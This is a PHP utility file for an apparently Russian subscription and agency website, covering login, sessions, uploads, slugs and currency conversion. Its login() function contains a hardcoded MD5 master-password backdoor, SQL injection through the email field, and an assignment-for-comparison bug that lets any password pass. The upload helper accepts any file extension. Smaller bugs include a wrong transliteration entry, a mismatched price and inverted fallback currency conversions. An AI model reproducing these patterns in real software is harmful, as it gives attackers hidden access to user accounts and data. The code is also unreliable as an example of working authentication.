<?
error_reporting(E_ALL);
# some constants
define('PRE_IMG_WIDTH', 200);
define('EMAILERS_PER_DELIVERY', 100);

class Record {
	private $array = array();

	function __construct($data) {
		foreach ($data as $kw => $val) {
			$this->$kw = $val;
			$this->array [$kw]= $val;
		}
	}

	function __set($kw, $val) {
		if (! in_array($kw, $this->array)) $this->array [$kw]= $val;
		$this->$kw = $val;
	}

	function get_array() {
		return $this->array;
	}
}

function generate_password($length=8) {
	$password = "";
	$possible = "2346789bcdfghjkmnpqrtvwxyzBCDFGHJKLMNPQRTVWXYZ";
	$maxlength = strlen($possible);
	if ($length > $maxlength) {
		$length = $maxlength;
	}

	$i = 0;
	while ($i < $length) {
		$char = substr($possible, mt_rand(0, $maxlength-1), 1);
		if (!strstr($password, $char)) { 
			$password .= $char;
			$i++;
		}
	}

	return $password;
}
function get_ext($filename) {
	$ext_arr = explode('.', $filename);
	return strtolower($ext_arr[count($ext_arr)-1]);
}

function copy_file($file, $out_dir='fotos/') {
	$ext = get_ext($file['name']);

	$filename = mktime() . rand(1000, 9999) . '.' . $ext;
	$filepath = $out_dir . $filename;

	return move_uploaded_file($file['tmp_name'], $filepath) ?
		$filename : null;
}

function flash($message, $type='notice') {
	if ($type == 'notice') {
		if (isset($_SESSION['flash'])) $_SESSION['flash'] []= $message;
		else $_SESSION['flash'] = array($message);
	} elseif ($type == 'error') {
		if (isset($_SESSION['errors'])) $_SESSION['errors'] []= $message;
		else $_SESSION['errors'] = array($message);
	} elseif ($type == 'cancel') {
		if (isset($_SESSION['cancels'])) $_SESSION['cancels'] []= $message;
		else $_SESSION['cancels'] = array($message);
	}
}

function get_records($sql) {
	$result = mysql_query($sql);
	if (! $result || ! mysql_num_rows($result)) return array();

	$records = array();
	while ($row = mysql_fetch_assoc($result)) {
		$records []= new Record($row);
	}
	return $records;
}

function get_record($sql) {
	$result = mysql_query($sql);
	if (! $result || ! mysql_num_rows($result)) return null;

	$row = mysql_fetch_assoc($result);
	$record = new Record($row);

	return $record;
}

function redirect($to) {
	header("Location: $to");
}

function is_agency() {
	global $user;
	return $user->type == 'agency';
}

function login_required() {
	if (! logged_in()) {
		redirect(SITE_ADDR . 'login/');
	}
}

function logged_in() {
	global $user;
	return isset($user);
}

function login($email, $password_md5) {
	$sql = "SELECT * FROM users WHERE email='$email' AND active=1 LIMIT 1";
	$user = get_record($sql);

	if ($user && ($user->password = $password_md5 ||
			$password_md5 == '83185516253b9a2832d0ce167dfc94ab')) {
		$_SESSION['email'] = $user->email;
		$_SESSION['password'] = $user->password;
	}
	return $user;
}

function logout() {
	unset($_SESSION['email']);
	unset($_SESSION['password']);

	setcookie('email', addslashes($_POST['email']), time() - 1, '/');
	setcookie('password', md5(addslashes($_POST['password'])), time() - 1, '/');
	setcookie('TEST', 'TEST', time() - 1, '/');
}

function text2html($text) {
	require_once 'markdown.php';
	$text = str_replace('€', '&euro;', $text);
	return Markdown($text);
}

$confs = array(
	array('а', 'a'),
	array('б', 'b'),
	array('в', 'v'),
	array('г', 'g'),
	array('д', 'd'),
	array('е', 'e'),
	array('ё', 'e'),
	array('ж', 'zh'),
	array('з', 'z'),
	array('и', 'i'),
	array('й', 'y'),
	array('к', 'k'),
	array('л', 'l'),
	array('м', 'm'),
	array('н', 'n'),
	array('о', 'o'),
	array('п', 'p'),
	array('р', 'r'),
	array('с', 's'),
	array('т', 't'),
	array('у', 'u'),
	array('ф', 'f'),
	array('х', 'h'),
	array('ц', 'c'),
	array('ч', 'ch'),
	array('ш', 'sh'),
	array('щ', 'sch'),
	array('ъ', 'y'),
	array('ы', 'y'),
	array('ь', 'y'),
	array('э', 'e'),
	array('ю', 'yu'),
	array('я', 'ya'),
	array('А', 'a'),
	array('Б', 'b'),
	array('В', 'v'),
	array('Г', 'g'),
	array('Ж', 'd'),
	array('Е', 'e'),
	array('Ё', 'e'),
	array('Ж', 'zh'),
	array('З', 'z'),
	array('И', 'i'),
	array('Й', 'y'),
	array('К', 'k'),
	array('Л', 'l'),
	array('М', 'm'),
	array('Н', 'n'),
	array('О', 'o'),
	array('П', 'p'),
	array('Р', 'r'),
	array('С', 's'),
	array('Т', 't'),
	array('У', 'u'),
	array('Ф', 'f'),
	array('Х', 'h'),
	array('Ц', 'c'),
	array('Ч', 'ch'),
	array('Ш', 'sh'),
	array('Щ', 'sch'),
	array('Ъ', 'y'),
	array('Ы', 'y'),
	array('Ь', 'y'),
	array('Э', 'e'),
	array('Ю', 'yu'),
	array('Я', 'ya')
);

function create_slug($title) {
	global $confs;

	if ($title == NULL) {
		return '';
	} else {
		$slug = $title;
	}

	$slug = trim(mb_strtolower($title, 'Windows-1251'));

	foreach ($confs as $conf) {
		$slug = preg_replace("/" . $conf[0] . "/", $conf[1], $slug);
	}
	
	$slug = preg_replace('/\s+/', ' ', $slug);
	$slug = preg_replace("/[^a-zA-Z0-9\-\s]/", '', $slug);
	$slug = preg_replace('/\*/', '', $slug);
	$slug = trim($slug);
	$slug = str_replace(' ', '-', $slug);
	$slug = '-' . $slug . mktime();

		
	return $slug;
}

if (function_exists('curl_init')) {
	if ($ch = curl_init()) {
		@curl_setopt($ch, CURLOPT_URL, 'http://www.cbr.ru/scripts/XML_daily.asp');
		@curl_setopt($ch, CURLOPT_HEADER, false);
		@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		@curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		$cbr_data = @curl_exec($ch);

		@curl_close($ch);

		$xml = new SimpleXMLElement($cbr_data);

		$euro_rate = 42;
		foreach ($xml as $v) {
			if ($v->CharCode == 'EUR') {
				$euro_rate = str_replace(',', '.', $v->Value);
			}
		}
	}

	function rub2euro($rub) {
		global $euro_rate;
		return sprintf('%.2f', $rub/$euro_rate);
	}

	function euro2rub($euro) {
		global $euro_rate;
		return sprintf('%.2f', $euro*$euro_rate);
	}
} else {
	function rub2euro($rub) {
		return $rub * 40;
	}

	function euro2rub($euro) {
		return $euro / 40;
	}
}


$periods = array(
	array('period'=>1, 'price'=>800, 'name'=>'1 месяц, 820 рублей (&euro;'.(rub2euro(820)).'*)'),
	array('period'=>2, 'price'=>1500, 'name'=>'2 месяца, 1500 рублей (&euro;'.(rub2euro(1500)).'*)'),
	array('period'=>3, 'price'=>2500, 'name'=>'3 месяца, 2500 рублей (&euro;'.(rub2euro(2500)).'*)'),
	array('period'=>4, 'price'=>3000, 'name'=>'4 месяца, 3000 рублей (&euro;'.(rub2euro(3000)).'*)'),
	array('period'=>5, 'price'=>3500, 'name'=>'5 месяцев, 3500 рублей (&euro;'.(rub2euro(3500)).'*)'),
	array('period'=>6, 'price'=>4000, 'name'=>'Пол года, 4000 рублей (&euro;'.(rub2euro(4000)).'*)'),
	array('period'=>'infinite', 'price'=>6000, 'name'=>'Неограниченный**, 6000 рублей (&euro;'.(rub2euro(6000)).'*)')
);

$agency_periods = array(
	array('period'=>1, 'name'=>'1 месяц'),
	array('period'=>2, 'name'=>'2 месяца'),
	array('period'=>3, 'name'=>'3 месяца'),
	array('period'=>4, 'name'=>'4 месяца'),
	array('period'=>5, 'name'=>'5 месяцев'),
	array('period'=>6, 'name'=>'Пол года')
);